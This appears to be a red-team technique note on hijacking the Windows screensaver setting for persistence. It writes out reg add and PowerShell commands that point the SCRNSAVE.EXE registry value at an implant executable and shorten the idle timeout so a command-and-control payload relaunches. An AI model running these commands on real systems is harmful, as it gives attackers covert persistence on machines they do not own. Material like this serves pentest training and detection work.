# Screensavers Hijack

#### Screensavers are part of Windows functionality and enable users to put a screen message or a graphic animation after a period of inactivity. This feature of Windows it is known to be abused by threat actors as a method of persistence.

#### &#x20;This is because screensavers are executable files that have the `.scr` file extension and are executed via the `scrnsave.scr` utility.

{% hint style="warning" %}
#### This will not work in systems that don't have screensaver activated or in AD environments where the screensaver is manager by domain group policies.
{% endhint %}

Screensaver settings are stored in the registry and the values that are considered most valuable from an offensive perspective are:

```
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
```

Registry keys can be modified or added via the command prompt or from a PowerShell console. Since the .scr files are essentially executables both extensions can be used to the file that will act as the implant

```
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\tmp\pentestlab.exe
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\tmp\pentestlab.scr
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'c:\tmp\pentestlab.exe'
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'c:\tmp\pentestlab.scr'
```

Once the period of inactivity is passed the arbitrary payload will executed and a communication will the command and control will established again.

another thing to consider is the timeout when setting the registry key.

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "c:\rto\pers\implant\implant.exe" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "60" /f
```

{% hint style="info" %}
The issue with the persistence technique that utilize screensavers is that the session will drop when the user returns back and the system is not in idle mode. However red teams can perform their operations during the absence of the user. If screensavers are disabled by group policy this technique cannot be used for persistence.
{% endhint %}
